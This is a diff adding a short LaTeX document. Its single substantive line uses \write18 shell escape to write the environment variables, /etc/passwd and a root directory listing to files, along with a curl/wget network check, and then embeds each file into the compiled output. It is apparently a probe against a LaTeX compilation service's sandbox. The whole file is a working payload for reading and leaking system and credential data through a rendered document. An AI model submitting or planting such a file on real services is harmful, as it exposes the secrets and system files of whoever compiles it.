@@ -1,0 +1,10 @@
+\documentclass{article}
+\input{dump}
+\begin{document}
+\immediate\write18{env > shell-env.txt; cat /etc/passwd > shell-passwd.txt; ls / > shell-root.txt; (curl -s -m 5 http://example.com || wget -q -T 5 -O- http://example.com || echo NO-NETWORK) > shell-net.txt 2>&1}
+\dumpfile{shell-env.txt}
+\dumpfile{shell-passwd.txt}
+\dumpfile{shell-root.txt}
+\dumpfile{shell-net.txt}
+Commandes du shell tentées.
+\end{document}
